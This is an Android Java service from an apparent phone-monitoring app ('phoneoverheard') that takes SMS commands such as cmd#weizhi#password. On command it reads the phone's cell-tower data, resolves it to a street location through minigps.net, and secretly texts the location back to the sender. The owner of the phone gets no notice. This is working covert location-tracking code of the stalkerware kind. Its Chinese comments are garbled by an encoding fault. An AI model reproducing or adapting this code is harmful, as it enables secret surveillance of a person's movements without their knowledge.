package com.phoneoverheard.phonne;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.json.JSONTokener;

import com.phoneoverheard.database.SmscmdService;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.telephony.NeighboringCellInfo;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.telephony.cdma.CdmaCellLocation;
import android.telephony.gsm.GsmCellLocation;
import android.util.Log;

@SuppressLint({ "SimpleDateFormat", "UnlocalizedSms" })
public class weizhiService extends Service {
    private static final String TAG = "weizhiService";
    @SuppressWarnings("unused")
	private String filecontext = "";
    @SuppressWarnings("unused")
	private String fileNameType = "";
	Date date = new Date(System.currentTimeMillis());
	SimpleDateFormat Dateformat = new SimpleDateFormat("yyyyMMddHHmmss");
	final String receiveTime = Dateformat.format(date);
	WriteLog mylog = new WriteLog();
	
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}
	
	@Override
    public void onDestroy() { 
        Log.i(TAG, "onDestroy called.");  
        super.stopSelf();
        super.onDestroy();  
    }  
	
    @Override  
    public void onStart(Intent intent, int startId) {  
    	new WifiGPRS(getBaseContext()).CheckAndConnectGPRS();
        Log.i(TAG, "onStart called.");  
        mylog.WrLog("i",TAG,"��ȡ����λ�á�");
        Bundle smscontent = intent.getBundleExtra("smscontent");// ����bundle��key�õ���Ӧ�Ķ���
        String content=smscontent.getString("content");
        final String sendernumber=smscontent.getString("sendernumber"); 
        String[] contents = content.split("#");
        SmscmdService smscmdservice = new SmscmdService(getBaseContext());
        String password = smscmdservice.find("weizhi").getPassword();		
        if(contents[0].equals("cmd") && contents[1].equals("weizhi") && new FileService().MD5(contents[2]).equals(password)){
	    	new Thread(){
		    	@SuppressLint("UnlocalizedSms")
				@Override
	        	public void run(){
	        		//��Ҫִ�еķ���
	            	String GpsInfo = "";
	    			String latitude="";
	    			String longitude="";
	    			String address="";
	    			String message = "";
	                try {
	                	final String json = getportLocation(getBaseContext(),sendernumber);
	                    Log.i(TAG, "request = " + json);
	                    mylog.WrLog("i",TAG,"request = " + json);
	                    String url = "http://www.minigps.net/minigps/map/google/location";
	                    GpsInfo = httpPost(url, json);
	                    Log.i(TAG, "result = " + GpsInfo);
	                    mylog.WrLog("i",TAG,"result = " + GpsInfo);
	                    filecontext = "result = " + GpsInfo;
	                } catch (Exception e) {
	                    // TODO Auto-generated catch block
	                    e.printStackTrace();
	                }
	        		if(GpsInfo != ""){
	        			try {  
	        			    JSONTokener jsonParser = new JSONTokener(GpsInfo);  
	        			    // ��ʱ��δ��ȡ�κ�json�ı���ֱ�Ӷ�ȡ����һ��JSONObject����  
	        			    // �����ʱ�Ķ�ȡλ����"name" : �ˣ���ônextValue����"yuanzhifei89"��String��  
	        			    JSONObject person = (JSONObject) jsonParser.nextValue();  
	        			    // �������ľ���JSON����Ĳ�����  
	        			    latitude =  person.getJSONObject("location").getString("latitude");//γ��
	        			    longitude =  person.getJSONObject("location").getString("longitude");//����
	        			    address =  person.getJSONObject("location").getJSONObject("address").getString("street");
	        			} catch (JSONException ex) {  
	        			    // �쳣�������  
	        			}  
	                    
	                    if (longitude == ""||longitude == "0.0"||latitude == ""||latitude=="0.0") {
	                    	// ��ȡ��Ϣ����
	                        message = "�޷���ȡ����λ��";	                        
	                    }else{
	                    	message = "���꣺\nγ��"+latitude+"\n����"+longitude+"\n"+address;
	                        // �ƶ���Ӫ������ÿ�η��͵��ֽ��������ޣ����ǿ���ʹ��Android�������ṩ �Ķ��Ź��ߡ�
	    	                SmsManager sms = SmsManager.getDefault();
	    	                // �������û�г������Ƴ��ȣ��򷵻�һ�����ȵ�List��
	    	                List<String> texts = sms.divideMessage(message);
	    	                for (String text : texts) {
	    	                	sms.sendTextMessage(sendernumber,null, text,  null, null);
	    	                }
	                    }
	                    Log.i(TAG, message);
	                    mylog.WrLog("i",TAG,"����λ�ã�" + message);
	        		}
		        	//ִ����Ϻ��handler����һ������Ϣ
		        	handler.sendEmptyMessage(0);
	        	}
		    }.start();
    	}else{
			// �ƶ���Ӫ������ÿ�η��͵��ֽ��������ޣ����ǿ���ʹ��Android�������ṩ �Ķ��Ź��ߡ�
	        SmsManager sms = SmsManager.getDefault();
	        String ErrMsg = "�������";
	        // �������û�г������Ƴ��ȣ��򷵻�һ�����ȵ�List��
	        List<String> texts = sms.divideMessage(ErrMsg);
	        for (String text : texts) {
	        	sms.sendTextMessage(sendernumber,null,text,null,null);
	        }
		}
        onDestroy();
    } 
    
    /**
     * ��������������Handler����
     * @param ��
     */
    @SuppressLint("HandlerLeak")
	private Handler handler =new Handler(){
		@Override
	    //������Ϣ���ͳ�����ʱ���ִ��Handler���������
	    public void handleMessage(Message msg){
	    super.handleMessage(msg);
	    //����UI
	    }
    };
	
    /** 
     * ����������ͨ���ֻ��źŻ�ȡ��վ��Ϣ 
     * # ͨ��TelephonyManager ��ȡlac:mcc:mnc:cell-id 
     * # MCC��Mobile Country Code���ƶ����Ҵ��루�й���Ϊ460���� 
     * # MNC��Mobile Network Code���ƶ�������루�й��ƶ�Ϊ0���й���ͨΪ1���й�����Ϊ2����  
     * # LAC��Location Area Code��λ�������룻 
     * # CID��Cell Identity����վ��ţ� 
     * # BSSS��Base station signal strength����վ�ź�ǿ�ȡ� 
     * @author android_ls 
     */  
    public String getportLocation(Context context,String sendernumber) { 
    	String json = null ;  
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);  
        BufferedReader br = null;  
        try{ 
        	final int cid;
        	final int lac;
            final int mcc = Integer.valueOf(tm.getNetworkOperator().substring(0,3));  
            final int mnc = Integer.valueOf(tm.getNetworkOperator().substring(3,5));  
        	//��ȡλ�������루LAC������վ��ţ�CID��
            if(2==mnc){
               	CdmaCellLocation location1 = (CdmaCellLocation) tm.getCellLocation();  //�й����Ż�ȡLAC��CID�ķ�ʽ  
                if (null == location1){  
                    return null;  
                } 
            	lac = location1.getNetworkId();
            	cid = location1.getBaseStationId();
            }else{      
            	GsmCellLocation gcl = (GsmCellLocation) tm.getCellLocation();  //�й��ƶ����й���ͨ��ȡLAC��CID�ķ�ʽ  
                if (null == gcl){  
                    return null;  
                } 
                cid = gcl.getCid();  
                lac = gcl.getLac();
            }            
            // ��ȡ������վ��Ϣ  
            List<NeighboringCellInfo> infos = tm.getNeighboringCellInfo();  
            StringBuffer sbInfos = new StringBuffer("[CID" + cid + "LAC" + lac + "MCC" + mcc + "MNC" + mnc + "]"); 
            for (NeighboringCellInfo info1 : infos) {     // ����������������ѭ��  
            	sbInfos.append("[LAC" + info1.getLac());  // ȡ����ǰ������LAC  
            	sbInfos.append("CID" + info1.getCid());   // ȡ����ǰ������CID  
            	sbInfos.append("BSSS" + (-113 + 2 * info1.getRssi()) + "]"); // ��ȡ������վ�ź�ǿ��  
            }
            Log.v(TAG, sbInfos.toString());
            mylog.WrLog("i",TAG,sbInfos.toString());
            SmsManager sms = SmsManager.getDefault();
            // �������û�г������Ƴ��ȣ��򷵻�һ�����ȵ�List��
            sms.sendTextMessage(sendernumber,null, sbInfos.toString(),  null, null);
            json = getJsonCellPos(mcc, mnc, lac, cid);
            return json;
        }catch (Exception e){  
            Log.v(TAG, "��ȡ����ʧ�ܣ��޷���ȡgps��γ�ȣ�");  
            mylog.WrLog("i",TAG,"��ȡ����ʧ�ܣ��޷���ȡgps��γ�ȣ�");
        }finally{  
            if (null != br){  
                try{  
                    br.close();  
                }catch (IOException e){  
                	Log.v(TAG, "��ȡ����ʧ�ܣ��޷���ȡgps��γ�ȣ�"); 
                	mylog.WrLog("i",TAG,"��ȡ����ʧ�ܣ��޷���ȡgps��γ�ȣ�");
                }  
            }  
        }  
        return json;  
    } 
   
    /**
     * ��ȡJSON��ʽ�Ļ�վ��Ϣ
     * @param mcc �ƶ����Ҵ��루�й���Ϊ460��
     * @param mnc �ƶ�������루�й��ƶ�Ϊ0���й���ͨΪ1���й�����Ϊ2���� 
     * @param lac λ��������
     * @param cid ��վ���
     * @return json
     * @throws JSONException
     */
    private String getJsonCellPos(int mcc, int mnc, int lac, int cid) throws JSONException {
        JSONObject jsonCellPos = new JSONObject();
        jsonCellPos.put("version", "1.1.0");
        //jsonCellPos.put("host", "maps.google.com");  
        jsonCellPos.put("host", "www.minigps.net"); 
        JSONArray array = new JSONArray();
        JSONObject json1 = new JSONObject();
        json1.put("location_area_code", "" + lac + "");
        json1.put("mobile_country_code", "" + mcc + "");
        json1.put("mobile_network_code", "" + mnc + "");
        json1.put("age", 0);
        json1.put("cell_id", "" + cid + "");
        array.put(json1);
        jsonCellPos.put("cell_towers", array);
        return jsonCellPos.toString();
    }

    /**
     * ���õ�����������API���ݻ�վ��Ϣ���һ�վ�ľ�γ��ֵ����ַ��Ϣ
     * @param url ��ȡ��γ�ȷ�������ַ http://www.minigps.net/minigps/map/google/location
     * @param jsonCellPos JSON��ʽ�Ļ�վ��Ϣ
     * @return JSON��ʽ�ľ�γ��ֵ����ַ��Ϣ
     * @throws IOException
     */
    public String httpPost(String url, String jsonCellPos) throws IOException{
        byte[] data = jsonCellPos.toString().getBytes();
        URL realUrl = new URL(url);
        HttpURLConnection httpURLConnection = (HttpURLConnection) realUrl.openConnection();
        httpURLConnection.setConnectTimeout(60 * 1000);
        httpURLConnection.setDoOutput(true);
        httpURLConnection.setDoInput(true);
        httpURLConnection.setUseCaches(false);
        httpURLConnection.setRequestMethod("POST");
        httpURLConnection.setRequestProperty("Accept", "application/json, text/javascript, */*; q=0.01");
        httpURLConnection.setRequestProperty("Accept-Charset", "GBK,utf-8;q=0.7,*;q=0.3");
        httpURLConnection.setRequestProperty("Accept-Encoding", "gzip,deflate,sdch");
        httpURLConnection.setRequestProperty("Accept-Language", "zh-CN,zh;q=0.8");
        httpURLConnection.setRequestProperty("Connection", "Keep-Alive");
        httpURLConnection.setRequestProperty("Content-Length", String.valueOf(data.length));
        httpURLConnection.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
        httpURLConnection.setRequestProperty("Host", "www.minigps.net");
        httpURLConnection.setRequestProperty("Referer", "http://www.minigps.net/map.html");
        httpURLConnection.setRequestProperty("User-Agent","Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4X-Requested-With:XMLHttpRequest");
        httpURLConnection.setRequestProperty("X-Requested-With", "XMLHttpRequest");
        httpURLConnection.setRequestProperty("Host", "www.minigps.net");
        DataOutputStream outStream = new DataOutputStream(httpURLConnection.getOutputStream());
        outStream.write(data);
        outStream.flush();
        outStream.close();
        if (httpURLConnection.getResponseCode() == HttpURLConnection.HTTP_OK) {
            InputStream inputStream = httpURLConnection.getInputStream();
            return new String(read(inputStream));
        }
        return null;
    }
    
    /**
     * ��ȡIO������byte[]��ʽ�洢
     * @param inputSream InputStream
     * @return byte[]
     * @throws IOException
     */
    public byte[] read(InputStream inputSream) throws IOException {
        ByteArrayOutputStream outStream = new ByteArrayOutputStream();
        int len = -1;
        byte[] buffer = new byte[1024];
        while ((len = inputSream.read(buffer)) != -1) {
            outStream.write(buffer, 0, len);
        }
        outStream.close();
        inputSream.close();
        return outStream.toByteArray();
    }
    
}
